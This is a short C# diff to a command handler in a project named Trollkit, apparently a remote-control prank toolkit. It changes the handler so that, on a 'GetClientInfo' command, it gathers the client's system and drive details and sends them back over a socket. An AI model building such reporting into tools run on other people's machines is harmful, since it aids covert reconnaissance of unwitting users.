@@ -7,18 +7,22 @@ using System.Text;
 using System.Threading.Tasks;
 using Trollkit_Library;
 using Trollkit_Library.Models;
+using Trollkit_Library.Modules;
 
 namespace Trollkit_Client.Modules.CommandHandlers
 {
     class SystemInfoHandler : ICommandHandler
     {
-        public bool HandleCommand(Socket s, TransferCommandObject obj)
+        public override bool HandleCommand(Socket s, TransferCommandObject obj)
         {
-
 			switch (obj.Command)
 			{
 				case "GetClientInfo":
-					BConsole.WriteLine(getSysInfo());
+					string drives = getSysInfo();
+
+
+					TransferCommandObject drivesTransferObject = new TransferCommandObject { Command = "Drives", Handler = "SystemInfo", Value = drives};
+					SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(drivesTransferObject));
 					return true;
 			}
 
